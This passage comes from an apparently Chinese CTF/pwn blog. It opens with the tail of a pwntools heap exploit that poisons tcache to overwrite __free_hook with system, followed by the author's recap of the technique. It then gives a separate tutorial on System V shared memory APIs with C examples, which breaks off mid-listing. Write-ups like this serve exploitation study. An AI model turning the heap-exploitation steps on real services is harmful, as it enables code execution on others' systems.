class="line"></span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line">add_worker(p32(<span class="number">0x11111111</span>),p32(<span class="number">0x11111111</span>))</span><br><span class="line"></span><br><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">del_worker(<span class="number">0</span>)</span><br><span class="line">add_worker(<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">target_addr = ((heap_base + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>) ^ (free_hook - <span class="number">0xa8</span>)</span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0xb0</span> + p64(target_addr)[:<span class="number">6</span>]</span><br><span class="line">edit_worker(<span class="number">0</span>,p32(<span class="number">0x11111111</span>),payload)</span><br><span class="line">del_worker(<span class="number">5</span>)</span><br><span class="line">add_worker(<span class="string">&quot;d&quot;</span>*<span class="number">0xa0</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0xa0</span>)</span><br><span class="line">payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0xA8</span> + p64(system_libc)[:<span class="number">6</span>]</span><br><span class="line">edit_worker(<span class="number">5</span>,p32(<span class="number">0x11111111</span>),payload)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目主要就是逆向，打比赛的时候摆烂没有做出来，之后的复现还是比较轻松的</p>
<p>我的思路和官方wp还有些不一样，当时我看见3个连续的 free chunk 时就直接开始考虑溢出的事情了，现在想来官方wp对于堆风水的处理还有些冗余</p>
<ul>
<li>最好不要跨 chunk 进行溢出，我的第一个思路就需要跨 chunk，为了解决程序报错的问题，需要先找到报错的原因，然后进行对应的伪造，最后因为 payload 过长而不得不放弃</li>
<li>以后遇到类似的，还是要先搞清楚堆分配的规律（可以逆向，也可以直接试），然后再想办法制造相邻 chunk，以便进行溢出</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/22/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98shm%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/22/Principles%EF%BC%9A%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98shm%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：共享内存shm底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-22 17:56:28" itemprop="dateCreated datePublished" datetime="2022-09-22T17:56:28+08:00">2022-09-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-16 21:14:56" itemprop="dateModified" datetime="2022-11-16T21:14:56+08:00">2022-11-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>共享内存基础知识</strong></p>
<p>共享内存有两个，一个 mmap，一个 systemV 的 shm</p>
<p>由于所有用户进程总的虚拟地址空间比可用的物理内存大很多，因此只有最常用的部分才与物理页帧关联（这不是问题，因为大多数程序只占用实际可用内存的一小部分）</p>
<ul>
<li>在将磁盘上的数据映射到进程的虚拟地址空间的时，内核必须提供数据结构，以建立虚拟地址空间的区域和相关数据所在位置之间的关联，Linux 软件系统多级页表映射机制</li>
<li>共享内存使得多个进程可以访问同一块内存空间（节约了内存空间），不同进程可以及时看到对方进程中对共享内存中数据得更新（多个进程可以同时操作，所以需要进行同步 ，一般与信号量配合使用）</li>
</ul>
<p>本文主要介绍 shm</p>
<p><strong>共享内存的 API</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* 获取一个新的共享内存段 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>key：<ul>
<li>IPC_PRIVATE - “0”：会建立新共享内存对象 </li>
<li>大于0的32位整数：视参数 shmflg 来确定操作（通常要求此值来源于 <code>ftok</code> 返回的IPC键值）</li>
</ul>
</li>
<li>size：<ul>
<li>“0”：获取共享内存时指定为“0”</li>
<li>大于0的整数：新建的共享内存大小，以字节为单位</li>
</ul>
</li>
<li>shmflg：<ul>
<li>“0”：取共享内存标识符，若不存在则函数会报错</li>
<li>IPC_CREAT：如果内核中不存在键值与key相等的共享内存，则新建一个共享内存，如果存在这样的共享内存，返回此共享内存的标识符</li>
<li>IPC_CREAT | IPC_EXCL：如果内核中不存在键值与 key 相等的共享内存，则新建一个共享内存，如果存在这样的共享内存则报错</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回消息队列的标识符 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span>; <span class="comment">/* 进行内存映射 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>shmid：<ul>
<li>共享内存的标识符</li>
</ul>
</li>
<li>shmaddr：<ul>
<li>如果 <code>shmaddr</code> 为“0”则此段连接到由内核选择的第一个可用地址上</li>
<li>如果 <code>shmaddr</code> 非零，并且没有指定 SHM_RND，则此段链接到 <code>shmaddr</code> 所指的地址上，但是 <code>shmaddr</code> 必须是发生附加的页对齐地址</li>
<li>如果 <code>shmaddr</code> 非零且指定 SHM_RND，系统会自动对 <code>shmaddr</code> 进行页对齐</li>
</ul>
</li>
<li>shmflg：<ul>
<li>“0”：读写模式 </li>
<li>SHM_RDONLY：为只读模式</li>
<li>SHM_EXEC：指定对共享内存段的执行权限（对共享内存而言，所谓的执行权限实际上和读权限是一样的）</li>
<li>SHM_RND：取整，取向下一个 SHMLBA 边界 （shmaddr 非空时有效）</li>
<li>SHM_REMAP：附加上的接管区域 </li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回共享内存地址</li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
<li>PS：<ul>
<li><code>fork</code> 后子进程继承已连接的共享内存地址</li>
<li><code>exec</code> 后该子进程与已连接的共享内存地址自动脱离(detach)</li>
<li>目标进程结束后，已连接的共享内存地址会自动脱离(detach) </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>; <span class="comment">/* 删除内存映射 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>shmaddr：<ul>
<li>连接的共享内存的起始地址</li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回消息队列的标识符 </li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span>; <span class="comment">/* 对共享内存段进行操作 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：<ul>
<li>共享内存的标识符</li>
</ul>
</li>
<li>cmd：<ul>
<li>IPC_STAT：得到共享内存的状态，把共享内存的 shmid_ds 结构复制到 buf 中</li>
<li>IPC_SET：改变共享内存的状态，把 buf 所指的 shmid_ds 结构中的 uid、gid、mode 复制到共享内存的 shmid_ds 结构内 </li>
<li>IPC_RMID：删除这片共享内存（销毁 <code>shmget</code> 创建的 <code>shmid</code>）</li>
</ul>
</li>
<li>buf：<ul>
<li>共享内存管理结构体 </li>
</ul>
</li>
<li>return：<ul>
<li>成功：返回 “0”</li>
<li>出错：返回 “-1”，错误原因存于 error 中</li>
</ul>
</li>
</ul>
<p><strong>共享内存使用案例</strong></p>
<p>shm 写内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> shmid;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *pshm;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">key_t</span> key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key = 0x%x\n&quot;</span>,key);</span><br><span class="line">    shmid = shmget(key, <span class="number">1024</span> * <span class="number">10</span>, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    pshm = shmat(shmid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input node 0-9\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;node is %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input data\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">memcpy</span>(pshm + i * <span class="number">1024</span>, buf, <span class="number">1024</span>);</span><br><span class="line">    shmdt(pshm);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>shm 读内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> *pshm;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> shmid;</span><br><span class="line">    <span class="keyword">key_t</span> key = ftok(<span class="string">&quot;.&quot;</span>,<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key = 0x%x\n&quot;</span>,key);</span><br><span class="line">    shmid = shmget(key, <span class="number">1024</span> * <span class="number">10</span>, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    pshm = shmat(shmid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input node 0-9\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;node is %d\n&quot;</span>,i);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, pshm + i * <span class="number">1024</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;data [%s]\n&quot;</span>, buf);</span><br><span class="line">    shmdt(pshm);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>效果：（这里把 R/W 分为两个文件，体现其通信的特性）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./send</span><br><span class="line">key = <span class="number">0x7a05274f</span></span><br><span class="line">input node <span class="number">0</span><span class="number">-9</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">node is <span class="number">0</span></span><br><span class="line">input data</span><br><span class="line">yhellow </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./read</span><br><span class="line">key = <span class="number">0x7a05274f</span></span><br><span class="line">input node <span class="number">0</span><span class="number">-9</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">node is <span class="number">0</span></span><br><span class="line">data [yhellow]</span><br></pre></td></tr></table></figure>
<ul>
<li>表面和 msg 的效果很像：<ul>
<li>“共享内存段-<code>shmid_kernel</code>” 类似于 “消息队列-<code>msg_queue</code>”</li>
<li>“映射的内存-<code>shm_file_data</code>” 类似于 “消息-<code>msg_msg</code>”</li>
<li>但是</li>
</ul>
</li>
<li>只是多了片虚拟内存空间：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7ffff7fb0000</span>     <span class="number">0x7ffff7fb6000</span> rw-p     <span class="number">6000</span> <span class="number">0</span>      [anon_7ffff7fb0]</span><br><span class="line">    <span class="number">0x7ffff7fc6000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      /SYSV7a05274f (deleted)</span><br><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7fc6000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7fc6000</span> ◂— <span class="number">0x776f6c6c656879</span> <span class="comment">/* &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7fc6008</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>shm 父子进程通信：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">int</span> shmid;</span><br><span class="line">	<span class="keyword">char</span> *shm_addr;</span><br><span class="line">	<span class="keyword">char</span> flag[] = <span class="string">&quot;WROTE&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">2048</span>];</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, BUFFER_SIZE, <span class="number">0666</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Create shared-memory: %d\n&quot;</span>,shmid);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span> (pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">/* 子进程处理 */</span></span><br><span class="line">		<span class="keyword">if</span> ((shm_addr = shmat(shmid, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;Child: shmat&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Child: Attach shared-memory addr: %p\n&quot;</span>, shm_addr);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">strncmp</span>(shm_addr, flag, <span class="built_in">strlen</span>(flag)))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Child: Wait for enable data...\n&quot;</span>);</span><br><span class="line">			sleep(<span class="number">5</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(buff, shm_addr + <span class="built_in">strlen</span>(flag));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child: Shared-memory :%s\n&quot;</span>, buff);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((shmdt(shm_addr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;shmdt&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Child: Deattach shared-memory\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	  	system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">	  	</span><br><span class="line">	  	<span class="keyword">if</span> (shmctl(shmid, IPC_RMID, <span class="literal">NULL</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;Child: shmctl(IPC_RMID)\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Delete shared-memory\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="comment">/* 父进程处理 */</span></span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> ((shm_addr = shmat(shmid, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;Parent: shmat&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Parent: Attach shared-memory addr: %p\n&quot;</span>, shm_addr);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\nInput some string:(Parent)\n&quot;</span>);</span><br><span class="line">		fgets(buff, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">		<span class="built_in">strncpy</span>(shm_addr + <span class="built_in">strlen</span>(flag), buff, <span class="built_in">strlen</span>(buff));</span><br><span class="line">		<span class="built_in">strncpy</span>(shm_addr, flag, <span class="built_in">strlen</span>(flag));</span><br><span class="line">		system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((shmdt(shm_addr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			perror(<span class="string">&quot;Parent: shmdt&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Parent: Deattach shared-memory\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;ipcs -m&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Finished\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>效果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 